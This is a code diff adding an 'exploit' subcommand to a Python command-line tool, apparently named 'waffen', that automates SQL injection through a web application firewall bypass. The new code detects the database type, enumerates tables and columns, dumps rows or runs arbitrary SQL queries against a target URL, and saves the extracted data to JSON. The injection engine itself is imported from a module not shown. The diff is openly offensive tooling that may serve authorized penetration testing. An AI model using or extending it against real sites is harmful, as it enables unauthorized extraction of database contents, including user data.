@@ -1907,6 +1907,95 @@ def cmd_plugin(args) -> int:
     return 2
 
 
+def cmd_exploit(args) -> int:
+    if not args.target:
+        print("[err] --target is required", file=sys.stderr)
+        return 2
+    if not args.bypass_payload:
+        print("[err] --bypass-payload is required", file=sys.stderr)
+        return 2
+    from .exploit.sqli import SQLiExploiter
+    target = Target(base_url=args.target, path=args.path, param=args.param,
+                    inject=args.inject, method=args.method,
+                    timeout=args.timeout, tls_verify=args.tls_verify,
+                    block_signature=args.block_signature, **_auth_kwargs(args))
+    chain = [c.strip() for c in args.bypass_chain.split(",") if c.strip()] if args.bypass_chain else []
+
+    bn = ui.banner(__version__)
+    if bn:
+        print(bn)
+    print(ui.info("exploit for ") + ui.bold(args.target))
+    print(ui.gray(f"  bypass: {args.bypass_payload[:50]}  chain: {chain or 'none'}"))
+    print(ui.rule())
+
+    exploiter = SQLiExploiter(target, args.bypass_payload, bypass_chain=chain,
+                              transport=args.transport)
+
+    if args.auto:
+        print(ui.info("auto-exploit: detect → enumerate → extract"))
+        result = exploiter.run_auto()
+    else:
+        dbms = exploiter.detect_dbms()
+        print(f"  {ui.green('+')} DBMS: {ui.bold(dbms)}")
+        technique = exploiter.detect_technique()
+        print(f"  {ui.green('+')} Technique: {ui.bold(technique or 'none found')}")
+        if not technique:
+            print(ui.red("  no extraction technique found through WAF"))
+            return 1
+
+        if args.tables:
+            tables = exploiter.enumerate_tables()
+            print(f"\n  {ui.info('Tables:')} {', '.join(tables) if tables else 'none found'}")
+            return 0
+
+        if args.columns and args.table:
+            cols = exploiter.enumerate_columns(args.table)
+            print(f"\n  {ui.info(f'Columns in {args.table}:')} {', '.join(cols) if cols else 'none found'}")
+            return 0
+
+        if args.dump and args.table:
+            cols = [c.strip() for c in args.dump_columns.split(",")] if args.dump_columns else None
+            result = exploiter.extract(args.table, columns=cols, limit=args.limit)
+        elif args.query:
+            val = exploiter.extract_value(args.query)
+            print(f"\n  {ui.info('Result:')} {val}")
+            return 0
+        else:
+            print("[err] specify --tables, --columns, --dump, --query, or --auto", file=sys.stderr)
+            return 2
+
+    # Print results
+    print(ui.rule())
+    if result.error:
+        print(ui.red(f"  error: {result.error}"))
+    print(f"  {ui.info('DBMS:      ')} {result.dbms}")
+    print(f"  {ui.info('Technique: ')} {result.technique}")
+    print(f"  {ui.info('Table:     ')} {result.table}")
+    print(f"  {ui.info('Columns:   ')} {', '.join(result.columns)}")
+    print(f"  {ui.info('Rows:      ')} {len(result.data)}")
+    print(f"  {ui.info('Requests:  ')} {result.requests_used}")
+    print(f"  {ui.info('Duration:  ')} {result.duration:.1f}s")
+    if result.data:
+        print(f"\n  {ui.bold('Extracted data:')}")
+        for i, row in enumerate(result.data[:20]):
+            vals = "  |  ".join(f"{k}={v}" for k, v in row.items())
+            print(f"    [{i}] {vals}")
+    print(ui.rule())
+
+    if args.out:
+        import json as _json
+        from pathlib import Path as _P
+        data = {
+            "dbms": result.dbms, "technique": result.technique,
+            "table": result.table, "columns": result.columns,
+            "rows": result.data, "requests": result.requests_used,
+            "duration": result.duration, "error": result.error,
+        }
+        _P(args.out).write_text(_json.dumps(data, indent=2, ensure_ascii=False))
+        print(ui.ok(f"extraction results written to {args.out}"))
+    return 0 if result.data else 1
+
+
 def cmd_version(args) -> int:
     print(ui.banner(__version__, force=True))
     print(f"  waffen {__version__}")
@@ -2356,6 +2445,28 @@ def build_parser() -> argparse.ArgumentParser:
     pl.add_argument("--author", default="me", help="author name (for create)")
     pl.add_argument("--desc", default="", help="description (for create)")
     pl.set_defaults(func=cmd_plugin)
+
+    ex = sub.add_parser("exploit",
+                        help="exploit a confirmed SQLi bypass — extract data through the WAF")
+    _add_target_args(ex)
+    ex.add_argument("--param", default="q", help="parameter name (default: q)")
+    ex.add_argument("--inject", default="query", choices=["query", "body", "json"],
+                    help="where to inject (default: query)")
+    ex.add_argument("--method", default="GET", help="HTTP method (default: GET)")
+    ex.add_argument("--bypass-payload", default="", help="the WAF-bypassing payload (required)")
+    ex.add_argument("--bypass-chain", default="",
+                    help="comma-separated mutation chain that produced the bypass")
+    ex.add_argument("--auto", action="store_true",
+                    help="auto-exploit: detect DBMS + technique, enumerate, extract first table")
+    ex.add_argument("--tables", action="store_true", help="enumerate database tables")
+    ex.add_argument("--columns", action="store_true", help="enumerate columns (requires --table)")
+    ex.add_argument("--dump", action="store_true", help="extract rows (requires --table)")
+    ex.add_argument("--dump-columns", default="", help="specific columns to dump (comma-sep)")
+    ex.add_argument("--table", default="", help="target table name")
+    ex.add_argument("--query", default="", help="raw SQL query to extract a single value")
+    ex.add_argument("--limit", type=int, default=10, help="max rows to extract (default: 10)")
+    ex.add_argument("--out", default="", help="write extraction results JSON here")
+    ex.set_defaults(func=cmd_exploit)
 
     v = sub.add_parser("version", help="print version")
     v.set_defaults(func=cmd_version)
